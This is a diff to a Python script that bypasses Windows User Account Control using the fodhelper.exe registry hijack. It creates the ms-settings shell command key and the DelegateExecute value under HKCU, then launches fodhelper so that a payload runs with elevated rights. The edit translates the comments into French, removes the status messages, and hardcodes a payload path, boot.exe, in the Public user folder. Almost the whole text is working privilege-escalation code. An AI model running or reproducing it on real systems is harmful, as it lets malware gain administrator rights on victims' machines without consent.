@@ -1,17 +1,17 @@
 import os
 import sys
 import ctypes
-import winreg, time
+import winreg
 
 CMD                   = r"C:\Windows\System32\cmd.exe"
 FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
-REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
+REG_PATH              = r'Software\Classes\ms-settings\shell\open\command'
 DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
 
 def is_running_as_admin():
     '''
-    Checks if the script is running with administrative privileges.
-    Returns True if is running as admin, False otherwise.
+    Vérifie si le script est lancé avec les droits d'administrateurs.
+    Retourne True s'il est lancé en admin, False sinon.
     '''    
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -20,7 +20,7 @@ def is_running_as_admin():
 
 def create_reg_key(key, value):
     '''
-    Creates a reg key
+    Création une clé de registre
     '''
     try:        
         winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
@@ -32,7 +32,7 @@ def create_reg_key(key, value):
 
 def bypass_uac(cmd):
     '''
-    Tries to bypass the UAC
+    Créer les 2 clés de registre nécessaires pour outrepasser l'UAC
     '''
     try:
         create_reg_key(DELEGATE_EXEC_REG_KEY, '')
@@ -42,18 +42,14 @@ def bypass_uac(cmd):
 
 def execute():        
     if not is_running_as_admin():
-        #print('[!] The script is NOT running with administrative privileges')
-        #print('[+] Trying to bypass the UAC')
         try:          
-            current_dir = os.path.dirname(os.path.realpath('__file__')) + '\\' + 'bypass.exe'
-            cmd = '{} {}'.format(CMD, current_dir)
-            bypass_uac(cmd + " /c " + os.path.dirname(os.path.realpath('__file__')) + "\\boot.exe")                
+            current_dir = 'C:\\Users\\Public\\build\\exe.win-amd64-3.6\\boot.exe'
+            cmd = '{} /c {}'.format(CMD, current_dir)
+            bypass_uac(cmd)                
             os.system(FOD_HELPER)
             sys.exit(0)                
         except WindowsError:
-            sys.exit(1)
-    #else:
-        #print('[+] The script is running with administrative privileges!')  
+            sys.exit(1) 
 
 if __name__ == '__main__':
     execute()
